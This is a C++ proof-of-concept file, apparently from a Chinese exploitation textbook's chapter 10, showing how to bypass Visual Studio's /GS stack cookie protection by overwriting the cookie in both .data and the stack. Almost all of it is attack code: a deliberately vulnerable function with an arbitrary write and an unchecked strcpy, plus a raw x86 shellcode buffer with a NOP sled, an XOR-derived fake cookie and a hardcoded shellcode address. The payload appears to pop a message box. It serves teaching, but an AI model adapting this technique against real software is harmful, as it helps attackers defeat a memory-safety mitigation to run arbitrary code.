/*****************************************************************************
      To be the apostrophe which changed "Impossible" into "I'm possible"!
		
POC code of chapter 10 in book 
"Bypass GS by replacing the cookie in stack and .data at the same time"
 
file name	: GS_Replace.cpp
author		: zihan  
date		: 2010.03.26
description	: demo show of how to bypass GS replacing the cookie in 
                  stack and .data at the same time
Noticed		:	1 complied with VS 2008
			    2 disable optimization
		    	3 build into release version
		    	4 EBP and shellcode address may need 
			      to make sure via runtime debug
version		: 1.0
E-mail		: zihanlion@live.cn
		
	Only for educational purposes    enjoy the fun from exploiting :)
******************************************************************************/
#include <stdafx.h>
#include <string.h>
#include <stdlib.h>
char shellcode[]=
"\x90\x90\x90\x90"//new value of cookie in .data
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xF4\x6F\x82\x90"//result of \x90\x90\x90\x90 xor EBP
"\x90\x90\x90\x90"
"\x94\xFE\x12\x00"//address of shellcode
;
void test(char * str, int i, char * src)
{
	char dest[200];
	if(i<0x9995)
	{
		char * buf=str+i;
		*buf=*src;
		*(buf+1)=*(src+1);
		*(buf+2)=*(src+2);
		*(buf+3)=*(src+3);
	    strcpy(dest,src);
	}
}
void main()
{
	char * str=(char *)malloc(0x10000);
	test(str,0xFFFF2FB8,shellcode);	
}
